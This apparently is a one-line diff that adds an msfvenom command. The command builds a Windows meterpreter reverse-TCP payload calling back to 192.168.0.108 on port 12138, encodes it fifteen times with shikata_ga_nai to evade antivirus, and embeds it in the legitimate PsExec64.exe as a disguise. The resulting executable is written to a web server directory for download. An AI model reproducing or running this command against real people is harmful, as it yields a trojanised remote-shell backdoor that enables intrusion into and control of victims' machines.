@@ -1,0 +1,1 @@
+	>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -x PsExec64.exe  -i 15 -f exe -o /var/www/html/payload4.exe
